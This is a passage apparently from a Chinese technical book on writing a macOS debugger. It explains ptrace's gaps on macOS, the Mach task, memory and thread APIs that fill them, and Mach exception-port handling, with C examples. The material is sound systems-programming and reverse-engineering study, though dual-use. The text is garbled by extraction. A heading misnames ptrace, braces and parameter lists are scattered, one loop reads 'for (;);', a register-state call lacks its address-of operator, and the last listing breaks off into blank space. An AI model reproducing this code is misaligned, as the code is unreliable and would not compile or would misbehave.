可能由于苹果官方并不希望这些调试接口被逆向人员加以利用，这方面的文档几乎没有，有的也是一些过时已久的资料。另外苹果系统升级时经常会废弃或者修改一些API接口，使得调试接口在使用上更加麻烦与不稳定，也或许是目前苹果系统上没有一个好的第三方调试器的原因吧。

苹果系统每次升级都会为系统底层带来不少改动, 新的安全特性的加入会对底层接口带来不小的影响, 在笔者编写本节内容时, macOS 10.12系统对异常机制的一个改动, 使得最新版本的 GDB 无法正常地在 macOS 10.12 系统上运行。在 10.11.6 上测试良好的 Saber, 到了最新的 10.12 上, 又变得不正常了。为了解决 10.12 的兼容性问题, 又着实花了笔者不少时间。由此可见, 为 macOS 系统编写调试器, 要解决系统升级带来的问题可能是一个比较大的麻烦。不过幸运的是, 苹果开源了 LVM 和 XNU, 可以通过这些开源项目来学习 macOS 的调试接口, 本节所讲解的内容主要是源自笔者对 LLDB 代码的研究。

本节将首先介绍ptrace接口的功能与使用方式，并讨论在macOS上如何用其他API来实现ptrace缺失的功能，最后会学习macOS上的异常处理机制，以及如何不依赖于UNIX信号使用异常来驱动调试器。

#### 8.3.1 phrase 简介

ptrace是Linux、BSD等UNIX系统上的调试API。初看名字会让人误以为是与前面所讲的DTrace类似的跟踪工具，其实不然，ptrace是“Process Trace”的缩写，它提供了一套动态调试和跟踪其他进程的接口。

目前在Linux和BSD等系统上的调试器都是基于这套接口进行开发的，macOS的内核修改自BSD，自然也继承了这套调试接口。不过在macOS上的ptrace接口是不完整的，可能是苹果公司担心ptrace系列接口暴露了太多底层的东西或是被用于逆向而泄露其他信息，因而屏蔽了许多关键的功能。

trace对外开放的接口只有一个函数，函数名也是“ptrace”，声明在sys/ptrace.h中（取自Xcode 8.1 MacOSX SDK中的头文件）：intptrace(int_request, pid_t_pid, caddr_t_addr, int_data);。ptrace()函数一个有4个参数，其中第1个参数为要执行的操作，第2个参数是被调试进程的PID，第3个和第4个参数的功能并不固定，与所要执行的操作有关。

下面来详细看一下macOS上ptrace的主要功能。

□ PT_TRACE_ME。此功能只应该在被调试进程中调用，用于通知系统本进程将被父进程跟踪调试。在调用了PT_TRACE_ME之后，调用exec系列函数会产生SIGTRAP信号通知父进程。_pid、_addr、_data这3个参数没有使用。

□ PT_SIGEXC。将UNIX信号转换为Mach异常。此功能也只应该在被调试进程中使用，在PT_TRACE_ME之后调用。该功能为macOS特有，在BSD和Linux等系统中并不存在。macOS需要该参数值的原因将在下一节讲解Mach异常时详细说明。

PT_READ_I、PT_READ_D和PT_READ_U。用于调试器进程读取被调试进程的内存，此时_addr参数为要读取的被调试进程的内存地址，_data参数被忽略，ptrace()函数的返回值则是读取到的数据。这3个功能本身是有区别的，PT_READ_I用于读取指令（Instruction）空间的数据，PT_READ_D用于读取数据（Data）空间的数据，而PT_READ_U用于读取用户（User）空间的数据。不过在OpenBSD上，这3个功能的实现是完全相同的，都可以用来读取被调试进程的任意可读取位置的内存数据。而在macOS上，虽然头文件中有这3个宏定义，然而它们并不可用。

口 PT_WRITE_I、PT_WRITE_D和PT_WRITE_U。用于向被调试进程内存空间中写入数据，除此之外，与PT_READ_I、PT_READ_D和PT_READ_U是一样的，在macOS上也无法使用。

□ PT_CONTINUE。通知系统让挂起的被调试进程继续执行。_addr参数是恢复执行时从哪个地址继续执行，如果设置为1，则表示从中断时的位置继续执行。_data参数没有使用。在大多数调试器中并没有使用PT_CONTINUE功能，而是使用了其他的macOS特有的接口代替了这个接口，这可能是因为PT_CONTINUE与macOS的异常系统不太兼容。

☐ PT_KILL。终止被调试进程。_addr和_data参数将被忽略。效果与向被调试进程发送SIGKILL信号，父进程截取到信号后直接调用PT_CONTINUE一样。

PT_STEP。使被调试进程单步执行一条指令，当执行完一条指令之后，被调试进程将会被挂起并通知调试器进程。addr参数没有使用，_data参数用来表示是否忽略引起进程终止的信号。如果该参数为0，则忽略引起调试进程中止的信号，若不为0则继续处理信号。该功能在macOS上也无法使用。

PT_ATTACH、PT_ATTACHEXC。附加到指定的进程并开始调试，_addr、_data参数没有使用。

PT_ATTACH已经被标记为过时的功能，应该使用PT_ATTACHEXC代替。PT_ATTACHEXC与PT_ATTACH的不同之处在于它会将UNIX信号转换为Mach异常，PT_ATTACHEXC也是macOS特有的功能。

☐ PT_DETACH。与被调试进程分离，不再调试指定进程。

相信看到这里，读者也已经发现了，ptrace在macOS上非常鸡肋，缺少了太多对调试器来说十分重要的东西。与Linux和BSD的ptrace相比，不能使用ptrace来读写被调试进程的内存，也无法读写被调试进程的寄存器。

如果只借助ptrace系统调用，根本无法写出一个可用的调试器，我们下一节将详细介绍如何用系统提供的其他接口来实现ptrace缺失的功能。

#### 8.3.2 Mach 调试接口

由于在macOS上ptrace接口功能的缺失，必须寻找其他的方式来替代。接下来要介绍的这些函数大多数都来自于XNU内核中的Mach部分。在介绍这些函数之前，先介绍一点macOS的XNU内核的历史，以帮助大家对这些函数有一个系统的了解。

XNU最早是NeXT公司为了NeXTSTEP操作系统而发展的。它是一种混合式核心（Hybrid kernel），由卡内基梅隆大学开发的Mach、FreeBSD和I/O Kit等部分组成。前面提到的ptrace接口以及信号机制都来自于FreeBSD部分，而接下来要介绍的函数以及macOS中的异常处理机制则来自于Mach内核。

Mach内核是一个由卡内基梅隆大学开发的计算机操作系统微内核，主要用于操作系统的研究，现在基本上已经停止开发了。Mach内核的许多设计也被用在了BSD的内核中，于是在macOS、FreeBSD和Mach内核之间有着千丝万缕的联系。macOS和FreeBSD并没有完全采用Mach内核的微内核架构，可能是因为内核的理论过于学术派，各组件之间完全靠消息进行通信效率比较低下。

但是macOS中还是保留了Mach内核的消息机制Mach IPC/RPC用于内部组件的通信，在后面的异常处理章节中，将会使用Mach IPC/RPC来进行异常处理。除此之外，macOS还继承了Mach内核的任务管理机制和VM机制，弥补ptrace的缺失主要依赖Mach内核的任务管理机制和VM机制所提供的接口。

接下来详细看一下在调试器中要用到的Mach接口。

# 1. task_for_pid

这个系统调用返回指定的BSD进程ID对应的task port（任务端口号），task port是之后一系列系统调用都需要用到的一个参数。在Mach中，一个进程对应一个任务，而要对进程进行操作，必须要有对应的任务端口号。使用fork等UNIX系统调用创建新的进程，只会返回进程的pid，而要使用Mach接口对进程进行操作，则需要使用task_for_pid()获取对应的task port。

kern_return_t task_for_pid(
    mach_port_name_t target_port,
    int pid,
    mach_port_name_t *t);

苹果公司并没有给出该接口的文档，在Mach和XNU的源代码中也没有找到对应的实现，不过从参数上可以看出这个接口的使用方式。一般只会在当前进程中使用目标进程的task port，第一个参数一般固定为mach_task_self()获取的本进程的task port，剩下的两个参数则很明显是目标进程的PID和返回的目标进程的task port。函数如果成功会返回KERN_SUCCESS，否则为失败。

另外要注意的是调用该接口需要权限。只有使用可信证书经过签名的应用或者是root权限运行的应用才可以调用这个接口，否则会返回没有权限的错误。

# 2. mach_error_string

这个函数用于将Mach系统调用返回的错误码转换为人类可读的错误消息，比如task_for_pid()返回值不为KERN_SUCCESS，就可以将该返回值传递给mach_error_string()来获取对应的错误消息。

char *mach_error_string(mach_error_t err);

几乎所有的Mach系统调用的返回值都可以使用该接口转换成文本消息，这对后面的日志记

录有很大的帮助。在下面介绍的函数中，如果没有特殊说明，返回值都是返回KERN_SUCCESS为调用成功，调用失败则可以通过mach_error_string()来获取对应的消息。

# 3. mach $ \underline{vm} $read/ mach $ \underline{vm} $read $ \underline{overwrite} $

这两个函数用于读取其他进程的内存，前面提到ptrace的内存读写接口在macOS系统上都是无效的，现在可以使用这两个函数进行代替。

kern_return_t mach_vm_read

(
    vm_map_t target_task,
    mach_vm_address_t address,
    mach_vm_size_t size,
    vm_offset_t *data,
    mach_msg_type_number_t *dataCnt
);
kern_return_t mach_vm_read_overwrite

(
    vm_map_t target_task,
    mach_vm_address_t address,
    mach_vm_size_t size,
    mach_vm_address_t data,
    mach_vm_size_t *outsize
);

这两个函数功能是一致的，惟一的区别是 $ mach\_vm\_read() $会自动分配内存来保存读取到的内容，这个缓冲区用完后需要进行释放；而 $ mach\_vm\_read\_overwrite() $则需要传入一个缓冲区，它将读取到的内容存放到该缓冲区中。

这两个函数的参数有点多，以下是每个参数的作用。

☐ target_task: 需要读取内存的进程的task port。

☐ address: 要读取的内存的起始地址。

☐ size: 要读取的大小。

data: 对于mach_vm_read(), 需要传入一个vm_offset_t指针, 用于接收mach_vm_read()所创建的缓冲区, 而对于mach_vm_read_overwrite()这个参数, 则需要传入一个缓冲区的地址。

dataCnt与outsize: 返回实际读取到的大小。这两个接口并不一定会正好读取到所需要大小的内存内容，这个传出参数就是读取到的实际大小，不过实际读取到的大小是不会超过希望读取的大小的。

# 4. mach $ \underline{v} $m $ \underline{w} $rite

该函数的作用与 $ mach\_vm\_read() $正好相反，不过由于写入并不需要单独开辟内存空间，所以这个函数没有带 $ overwrite $的版本。

kern_return_t mach_vm_write
(
    vm_map_t target_task,
    mach_vm_address_t address,
)

vm_offset_t data,
mach_msg_type_number_t dataCnt
);

# 5. mach_vm_protect

将指定任务从address到address+size范围内的内存区域的保护级别设置为最高级别（set_maximum为true）或new_protection所指定的保护级别（set_maximum为false）。

kern_return_t mach_vm_protect
(
    vm_map_t target_task,
    mach_vm_address_t address,
    mach_vm_size_t size,
    boolean_t set_maximum,
    vm_prot_t new_protection
);
6. mach_vm_region_recurse

该函数用于获取指定内存地址位置的虚拟内存区域的信息。address参数指定要查询的地址，nesting_depth为要递归查询的子映射的深度。

kern_return_t mach_vm_region_recurse
(
vm_map_t target_task,
mach_vm_address_t *address,
mach_vm_size_t *size,
natural_t *nesting_depth,
vm_region_recurse_info_t info,
mach_msg_type_number_t *infoCnt
);

返回的区域起始地址和大小存放于address和size中，info中则返回内存区域的详细信息。

# 7. thread_get_state

获取指定线程对应的寄存器状态，可用于替代ptrace读取寄存器状态的功能。

kern_return_t thread_get_state
(
    thread_act_t target_act,
    thread_state_flavor_t flavor,
    thread_state_t old_state,
    mach_msg_type_number_t *old_stateCnt
);

flavor参数为要获取的寄存器分组，这个参数与系统和CPU相关，后两个参数分别为获取到的寄存器状态和状态的数量。由于我们的调试器只支持x64应用，因此只需要关心x64处理器上这个函数的用法，一般在x64 CPU上该函数用法如下：

x86_thread_state64_t threadState;
mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;
kern_return_t err = thread_get_state(thread, x86_THREAD_STATE64, (thread_state_t)threadState, &stateCount);

if (err != KERN_SUCCESS)
{
    //错误处理
}

threadState中保存的即为指定线程的通用寄存器状态。

# 8. thread_set_state

与thread_get_state相对应的函数，用于设置指定线程的寄存器状态。

kern_return_t thread_set_state
(
    thread_act_t target_act,
    thread_state_flavor_t flavor,
    thread_state_t new_state,
    mach_msg_type_number_t new_stateCnt
);

# 9. thread_suspend/ thread_resume

挂起指定线程和恢复指定线程的执行。每一个线程都有一个挂起计数器，每当对一个线程调用`thread_suspend()`一次，便会对这个计数器值+1，而对线程调用`thread_resume()`则会将计数器值-1。只有在挂起计数器为0的情况下，线程才会被正常地调度和执行。

kern_return_t thread_suspend
(
    thread_act_t target_act
);
kern_return_t thread_resume
(
    thread_act_t target_act
);
10. thread_terminate
强制结束指定线程。
kern_return_t thread_terminate
(
    thread_act_t target_act
);
11. task_threads

枚举指定任务中所有的线程，并将枚举结果放到act_list链表中，act_listCnt参数返回现成的数量。

   </div>

kern_return_t task_threads
(
task_t target_task,
thread_act_array_t *act_list,
mach_msg_type_number_t *act_listCnt
);

# 12. task_suspend/ task_resume

这两个函数用于挂起或恢复指定任务的执行，本质上就是通过task_threads()函数枚举任务中所有的线程，并通过thread_suspend()/thread_resume()挂起或恢复所有线程的执行。

kern_return_t task_suspend
(
    task_t target_task
);

kern_return_t task_resume
(
    task_t target_task
);

### 8.4 macOS 异常机制

在其他的UNIX系统中，信号是处理程序中的中断和崩溃错误的唯一方法。而在macOS中，除了从BSD中继承而来的信号机制，还新增了一套名为异常的机制来处理程序中发生的中断和严重的错误。在macOS上编写调试器，仅仅依赖信号来处理程序中发生的中断是不行的，还需要依赖macOS中的异常处理。这一节将详细讲解macOS中的异常处理机制，了解一个调试器应该如何处理被调试进程中产生的各种异常。

#### 8.4.1 异常与 Mach RPC/IPC

在macOS中的异常与UNIX信号或者Windows系统上的异常有一个很大的不同，macOS的异常信息是作为一个消息由系统内核通过Mach RPC发送到一个IPC端口上的，而不是从系统内核传递到用户态的处理函数中的。

那这个Mach RPC/IPC又是什么呢？简单地解释，Mach IPC是macOS中的一套进程间通信机制，与UNIX管道非常相似，而Mach RPC则是基于Mach IPC实现的一套远程过程调用接口。Mach作为一个微内核，几乎所有对象之间的通信都是通过消息来实现的，对象之间不能直接互相调用。源对象发送一条消息，这个消息会被存放于目标对象的队列中等待处理。

macOS中一般使用mach_msg函数来进行IPC消息的收发，在macOS上使用Mach IPC进行消息收发一般需要如下3个步骤。

(1) 申请一个用于收发消息的端口号，这个端口具有唯一的名称，并可以与其他进程共享。

(2) 将端口传递给其他任务。

(3) 使用mach_msg函数进行消息的收发。

Mach RPC则是基于Mach IPC实现的，与大多数RPC库一样也有一套DSL（Domain Specific Language）语言用于描述RPC的接口和要传输的数据。这种DSL一般保存在以“defs”结尾的文

件中，可以通过macOS上的工具mig（Mach Interface Generator）进行编译并生成C语言的源文件。mig生成的代码有以下两个作用。

口 解析RPC调用传入的消息，并调用对应的由用户实现的处理函数来处理解码后的消息。

☐ 将用户返回的数据编码成新的消息，用于响应RPC调用。

如果大家使用过protobuf或者thrift等序列化工具，就会很容易理解这套RPC的机制。不过没有接触过protobuf和thrift的读者也不用担心，我们并不需要太详细地了解Mach IPC/RPC。macOS SDK中已经写好了这个defs，并且异常处理有着一套固定的流程，只需要按照固定的步骤来进行处理即可，接下来看下macOS异常处理的一般流程。

首先，需要创建一个Mach端口，用于接收异常消息。创建一个用于接收异常消息的端口一般需要以下两个函数。

□ mach_port_allocate：用于创建一个新的端口。

☐ mach_port_insert_right：为新的异常端口添加接收消息的权限。

创建完成后，就可以把这个端口设置为某个任务的异常端口。设置异常端口可以使用 task_set_exception_ports()接口，函数原型如下：

kern_return_t task_set_exception_ports
(
task_t task,
exception_mask_t exception_mask,
mach_port_t new_port,
exception_behavior_t behavior,
thread_state_flavor_t new_flavor
);

很明显，task参数就是要设置异常端口的任务，new_port则是上面创建的新的端口；其他3个参数较为重要，exception_mask参数用于指定希望接收到哪些异常。可选的参数及作用如表8-1所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>可选参数</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_BAD_ACCESS</td><td style='text-align: center; word-wrap: break-word;'>内存访问错误，如访问野指针或者向不可写的地址执行写操作等</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_BAD_INSTRUCTION</td><td style='text-align: center; word-wrap: break-word;'>使用了未定义的指令或错误的操作数</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_ARITHMETIC</td><td style='text-align: center; word-wrap: break-word;'>算术异常，比如除零异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_EMULATION</td><td style='text-align: center; word-wrap: break-word;'>遇到了模拟指令</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_SOFTWARE</td><td style='text-align: center; word-wrap: break-word;'>由软件产生的异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_BREAKPOINT</td><td style='text-align: center; word-wrap: break-word;'>遇到了断点指令</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_SYSCALL</td><td style='text-align: center; word-wrap: break-word;'>系统调用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_MACH_SYSCALL</td><td style='text-align: center; word-wrap: break-word;'>Mach 系统调用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_RPC_ALERT</td><td style='text-align: center; word-wrap: break-word;'>RPC调用产生的异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXC_MASK_ALL</td><td style='text-align: center; word-wrap: break-word;'>接收所有的异常消息</td></tr></table>

   </div>

behavior参数指定了发生异常时需要生成什么信息，一共有4个可选参数，如表8-2所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>可选参数</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXCEPTION_DEFAULT</td><td style='text-align: center; word-wrap: break-word;'>将异常线程的线程标识符传递给异常处理程序，会调用catch_mach_exception_raise函数处理该异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXCEPTION_STATE</td><td style='text-align: center; word-wrap: break-word;'>将异常线程的寄存器状态传递给异常处理程序，会调用catch_mach_exception_raise_state函数处理该异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>EXCEPTION_STATE_IDENTITY</td><td style='text-align: center; word-wrap: break-word;'>将异常线程的标识符和状态都传递给异常处理程序，会调用catch_mach_exception_raise_state_identity函数处理该异常</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>MACH_EXCEPTION_CODES</td><td style='text-align: center; word-wrap: break-word;'>新版本macOS中添加的一个参数，可以与异常3个值中的任意一个进行或运算后传递给task_set_exception_ports，它指示异常的code和subcode使用64位的值</td></tr></table>

注意, catch_mach_exception_raise_state()、catch_mach_exception_raise_state_identity()和catch_mach_exception_raise()这3个函数需要用户自己实现。

new_flavor参数用于指示传递给异常处理程序的线程状态所包含的信息，这个参数的值与具体的CPU类型有关。

现在可以写一段代码来试验一下如何进行异常处理：

#include <mach/mach.h>
#include <mach/port.h>

#include <stdio.h>

mach_port_t exc_port;

void setup_exc_port()
{
    kern_return_t kr;
    // 创建一个端口用于接收异常消息
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr, "mach_port_allocate 失败, 错误消息: %s", mach_error_string(kr));
        exit(1);
    }

    // 为端口添加MACH_MSG_TYPE_MAKE_SEND权限
    // 这是task_set_exception_ports要求有的权限
    kr = mach_port_insert_right(mach_task_self(), exc_port, exc_port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS)
    {
        fprintf(stderr, "mach_port_insert_right 失败, 错误消息: %s", mach_error_string(kr));
        exit(1);
    }

    // 为当前任务设置异常端口
    kr = task_set_exception_ports(mach_task_self(),

EXC_MASK_ALL,
exc_port,
EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
THREAD_STATE_NONE);
if (kr != KERN_SUCCESS)
{
    fprintf(stderr, "task_set_exception_ports 失败, 错误消息: %s", mach_error_string(kr));
    exit(1);
}

int main()
{
    setup_exc_port();
    printf("完成异常端口的设置，执行触发异常的代码\n");
    int* a = NULL;
    *a = 1;
    printf("这句话不会被输出");

    return 0;
}

运行这段代码就会发现，程序既没有因为访问空指针而崩溃，也没有运行到结束。造成这个结果的原因在代码中，由于设置了一个新的异常处理端口，替换了系统默认的异常处理端口，因此当程序触发异常时并不会被系统结束掉。而我们也没有从设置的异常处理端口上读取异常消息并返回处理结果，于是程序会一直挂起，等待处理结果的返回。

那么该如何处理这个异常呢？此时就应该使用Mach IPC的消息收发函数 $ _{mach\_msg} $，来读取这个消息并进行处理和返回。

mach_msg()函数既可以用来发送消息，也可以用来接收消息，其函数原型如下：

mach_msg_return_t mach_msg(
    mach_msg_header_t *msg,
    mach_msg_option_t option,
    mach_msg_size_t send_size,
    mach_msg_size_t rcv_size,
    mach_port_name_t rcv_name,
    mach_msg_timeout_t timeout,
    mach_port_name_t notify);

msg参数在发送消息时为要发送的消息，在接收消息时为保存接收到消息的缓冲区。

option参数则是告诉系统是要接收消息还是发送消息，当设置为 $ MACH\_SEND\_MSG $时为向指定端口发送消息，设置为 $ MACH\_RCV\_MSG $则是从指定端口接收消息。此外这个参数还可以通过或运算添加一些其他选项，比如是否设置超时等。

send_size和rcv_size则是要接收或发送的消息的大小。如果只是要发送消息，则应当将rcv_size设置为0，反之则应将send_size设置为0。

rcv_name是接收消息时指定从哪个端口进行接收，回复消息时应该设置为 $ MACH\_PORT\_NULL $，因为回复一个消息时消息的header中会指定要回复到的端口。

timeout为超时时间，只在option中有超时选项时有效。

notify参数只应该在option中包含MACH_SEND_CANCEL或MACH_RCV_NOTIFY选项时使用，当发送被取消或收到消息时会向此端口发送一个通知。在其他情况下，这个端口应该设置为MACH_PORT_NULL。

收到消息后，如果要自己对消息进行解析会比较麻烦，这时候就需要通过mig和解析异常的defs文件，生成对应的C代码来进行解析。mig生成的C代码不但可以进行解析，而且会自动编码好要返回的消息。

解析异常消息的defs文件为mach_exc.defs，位于Xcode中MacOSD SDK的usr/include/mach文件夹下。如果每次都直接使用这个文件的绝对路径，那将会是一件非常麻烦的事情。有不少项目是直接将这个文件复制出来使用的，但是这样每次更新SDK就需要自己手动更新这个文件。其实这里有一个更简单的方法，那就是自己创建一个defs文件，文件中只需要一句代码：

#import <mach/mach_exc.defs>

将这个文件保存为exc.defs，然后执行如下命令进行编译：

mig exc. defs

这样 mig 工具会自动寻找正确的 mach_exc.defs 文件。执行完后会生成 mach_exc.h、mach_excServer.c 和 mach_excUser.c 这 3 个文件，这就是所需要的对异常消息进行编解码的代码。

把这3个文件添加到工程中，并为上面的异常处理代码添加接收和返回异常消息的代码，修改后的代码如下：

#include <mach/mach.h>
#include <mach/port.h>
#include <pthread.h>

#include <stdio.h>
#include <stdlib.h>

mach_port_t exc_port;
pthread_t thread;

boolean_t mach_exc_server(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP);
kern_return_t catch_mach_exception_raise_state(
    mach_port_t exc_port,
    exception_type_t exc_type,
    const mach_exception_data_t exc_data,
    mach_msg_type_number_t exc_data_count,
    int* flavor,
    const thread_state_t old_state,
    mach_msg_type_number_t old_stateCnt,
    thread_state_t new_state,
)

mach_msg_type_number_t* new_stateCnt)
{
    printf("In catch_mach_exception_raise_state");
    return KERN_FAILURE;
}

kern_return_t catch_mach_exception_raise_state_identity(
    mach_port_t exc_port,
    mach_port_t thread_port,
    mach_port_t task_port,
    exception_type_t exc_type,
    mach_exception_data_t exc_data,
    mach_msg_type_number_t exc_data_count,
    int* flavor, thread_state_t old_state,
    mach_msg_type_number_t old_stateCnt,
    thread_state_t new_state,
    mach_msg_type_number_t *new_stateCnt)
{
    printf("In catch_mach_exception_raise_state_identity");
    return KERN_FAILURE;
}

kern_return_t catch_mach_exception_raise(
    mach_port_t exc_port,
    mach_port_t thread_port,
    mach_port_t task_port,
    exception_type_t exc_type,
    mach_exception_data_t exc_data,
    mach_msg_type_number_t exc_data_count)
{
    printf("In catch_mach_exception_raise, exc_type: 0x%X\n", exc_type);
    return KERN_SUCCESS;
}

void* exc_handler_thread(void* _)
{
    for (;);
    {
        struct msg_t
    }
    {
        mach_msg_header_t head;
        char data[1024];
    };

    // 用于接收异常消息的缓冲区
    struct msg_t rcv_msg;

    // 处理完成后返回的消息
    struct msg_t snd_msg;

    // 开始读取异常消息
    kern_return_t kr = mach_msg(&rcv_msg.head,
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
                                                                                
